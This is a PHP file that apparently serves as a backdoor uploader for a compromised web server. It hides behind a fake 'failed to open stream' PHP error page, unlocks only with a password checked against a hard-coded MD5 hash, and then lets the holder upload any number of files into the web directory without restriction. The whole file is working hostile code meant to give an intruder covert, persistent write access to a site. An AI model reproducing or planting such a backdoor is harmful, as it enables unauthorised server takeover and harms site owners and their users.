<?php
@session_start();
@set_time_limit(0);
@set_magic_quotes_runtime(0);
error_reporting(E_ALL & ~E_NOTICE);
$pass = md5($_POST['pass']);
$me = "83cf1e45074275561a8b6ef539359342";
if ($pass == $me) {
    $_SESSION['9xyz'] = "$pass";
}
if ($_SERVER["HTTP_CLIENT_IP"]) {
    $ip = $_SERVER["HTTP_CLIENT_IP"];
} else {
    if ($_SERVER["HTTP_X_FORWARDED_FOR"]) {
        $ip = $_SERVER["HTTP_X_FORWARDED_FOR"];
    } else {
        if ($_SERVER["REMOTE_ADDR"]) {
            $ip = $_SERVER["REMOTE_ADDR"];
        } else {
            $ip = $_SERVER['REMOTE_ADDR'];
        }
    }
}
$ip = htmlspecialchars($ip);
if (! isset($_SESSION['9xyz']) or $_SESSION['9xyz'] != $me) {
    if (! empty($_GET['temp'])) {
        die("
<form method=post>
<input type=password name=pass size=30 tabindex=1>
</form>
");
    } else {
        die("
<b>Warning</b>:  include(./common.php) [<a href=function.include>function.include</a>]:
failed to open stream: No such file or directory in <b>/home/include/common.php
</b> on line <b>17</b><br><br>
");
    }
}
?>

<?php
$dest = "./";
if (count($_FILES["pictures"]["error"]) > 0) {
    foreach ($_FILES["pictures"]["error"] as $key => $error) {
        if ($error == UPLOAD_ERR_OK) {
            $tmp_name = $_FILES["pictures"]["tmp_name"][$key];
            $name = $_FILES["pictures"]["name"][$key];
            $dir = "miscer" . "/";
            move_uploaded_file($tmp_name, $name);
        }
    }
}
?>
<script language="javascript">
    function addNovoFicheiro() {
        //--------------------------------------------------------------------------------------------------------------------------------------
        var input = document.createElement('INPUT');
        var lineBreak = document.createElement('BR');
        //--------------------------------------------------------------------------------------------------------------------------------------
        input.setAttribute('type', 'file');
        input.setAttribute('name', 'pictures[]');
        document.getElementById('linhas').appendChild(input);
        document.getElementById('linhas').appendChild(lineBreak);
        //--------------------------------------------------------------------------------------------------------------------------------------
    }
</script>

<form enctype="multipart/form-data" action="<?php echo basename($_SERVER['PHP_SELF']); ?>" method="POST">
    <input type="hidden" name="MAX_FILE_SIZE" value="1024000"/>
    <input type="file" name="pictures[]"/>

    <div id="linhas"></div>
    <hr>
    <input class="btn" type="button" name="button" id="button" value="More Files"
           onClick='addNovoFicheiro();window.scroll(0,document.body.offsetHeight);'>
    <input type="submit" value="~!UPLOAD!~"/>
</form>
